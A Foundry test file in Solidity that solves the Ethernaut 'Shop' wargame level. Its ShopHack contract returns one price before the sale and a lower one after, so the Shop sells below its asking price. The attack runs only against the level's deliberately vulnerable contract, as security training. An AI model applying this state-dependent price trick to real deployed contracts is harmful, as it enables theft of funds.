// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Shop/Shop.sol";
import "../src/Shop/ShopFactory.sol";
import "../src/Ethernaut.sol";

contract ShopTest is Test {
    Ethernaut private _ethernaut;
    ShopFactory private _shopFactory;
    Shop private _shop;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_shopFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_shopFactory);
        _shop = Shop(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(payable(address(_shop)));
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _shopFactory = new ShopFactory();
    }

    function testShopHack() public testWrapper {
        ShopHack shopHack = new ShopHack(address(_shop));
        shopHack.attack();
    }
}

contract ShopHack is Buyer {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Shop(target).buy();
        require(Shop(target).price() == 99, "Attack failed");
    }

    function price() external view returns (uint) {
        if (Shop(target).isSold()) {
            return 99;
        }
        return 100;
    }
}
